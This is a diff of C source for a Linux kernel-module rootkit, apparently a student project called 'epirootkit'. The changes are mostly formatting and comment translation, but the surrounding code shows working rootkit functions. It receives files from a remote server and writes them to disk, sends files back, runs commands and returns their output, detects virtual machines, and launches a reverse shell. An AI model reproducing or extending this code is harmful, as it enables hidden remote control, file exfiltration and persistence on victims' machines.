@@ -2,33 +2,32 @@
 #include <linux/fs.h>
 #include <linux/kernel.h>
 #include <linux/kmod.h>
+#include <linux/mm.h>
 #include <linux/module.h>
+#include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/sched.h>
-#include <linux/mm.h>
 #include <linux/utsname.h>
 #include <linux/vmalloc.h>
 
 #include "crypto.h"
 #include "epirootkit.h"
+#include "io.h"
 #include "menu.h"
 #include "passwd.h"
-#include "vanish.h"
 #include "sysinfo.h"
-#include "io.h"
 #include "upload.h"
+#include "vanish.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
 
 extern struct socket *get_worker_socket(void);
 
-// ===== DOWNLOAD =====
+// Download variables
 static bool sending_file = false;
 static char *download_buffer = NULL;
 static long download_size = 0;
-
 
 // Handler prototypes
 static int connect_handler(char *args);
@@ -84,7 +83,8 @@ static int is_in_vm_handler(char *args) {
 
     if (is_running_in_virtual_env()) {
         send_to_server("[YES] The rootkit is running in a virtual machine.\n");
-    } else {
+    }
+    else {
         send_to_server("[NOP] The rootkit is not running in a virtual machine.\n");
     }
 
@@ -114,40 +114,41 @@ static int help_handler(char *args) {
 int rootkit_command(char *command, unsigned command_size) {
     if (receiving_file) {
         DBG_MSG("rootkit_command: réception chunk upload (%u octets)\n", command_size);
-    
+
         int chunk_size = command_size;
-    
-        // Protéger le buffer
+
+        // Protect against buffer overflow
         if (upload_received + chunk_size > upload_size)
             chunk_size = upload_size - upload_received;
-    
+
         memcpy(upload_buffer + upload_received, command, chunk_size);
         upload_received += chunk_size;
-    
+
         if (upload_received >= upload_size) {
             DBG_MSG("rootkit_command: réception complète (%ld octets), écriture dans %s\n",
                     upload_size, upload_path);
-    
+
             struct file *filp = filp_open(upload_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
             if (IS_ERR(filp)) {
                 ERR_MSG("rootkit_command: échec ouverture fichier\n");
                 send_to_server("❌ Erreur écriture fichier.\n");
-            } else {
+            }
+            else {
                 kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
                 filp_close(filp, NULL);
                 send_to_server("✅ Fichier écrit avec succès.\n");
                 DBG_MSG("rootkit_command: fichier écrit et fermé\n");
             }
-    
-            // Nettoyage
+
+            // Cleanup
             kfree(upload_path);
             vfree(upload_buffer);
             receiving_file = false;
         }
-    
-        return 0;  // Ne traite pas comme commande normale
 
-    } else if (sending_file && strncmp(command, "READY", 5) == 0) {
+        return 0;
+    }
+    else if (sending_file && strncmp(command, "READY", 5) == 0) {
         DBG_MSG("rootkit_command: envoi fichier (%ld octets)\n", download_size);
         send_to_server(download_buffer);
 
@@ -157,7 +158,7 @@ int rootkit_command(char *command, unsigned command_size) {
         sending_file = false;
         return 0;
     }
-    
+
     // Remove newline character if present
     command[strcspn(command, "\n")] = '\0';
 
@@ -304,7 +305,7 @@ static int exec_handler(char *args) {
             return -EIO;
         }
 
-        char code_msg[32] = {0};
+        char code_msg[32] = { 0 };
         snprintf(code_msg, sizeof(code_msg), "Terminated with code: %d\n", ret_code);
 
         char *output_msg = kmalloc(stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg), GFP_KERNEL);
@@ -316,7 +317,7 @@ static int exec_handler(char *args) {
         }
         snprintf(output_msg, stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
                  "%s%s%s%s%s", stdout_msg, stdout_buff, stderr_msg, stderr_buff, code_msg);
-                 
+
         send_to_server(output_msg);
         kfree(output_msg);
         kfree(stdout_buff);
@@ -380,7 +381,7 @@ static int getshell_handler(char *args) {
     // Lancer le reverse shell avec le port spécifié
     int ret_code = launch_reverse_shell(args);
 
-    if (ret_code < 0){
+    if (ret_code < 0) {
         ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);
         send_to_server("Failed to launch reverse shell\n");
     }
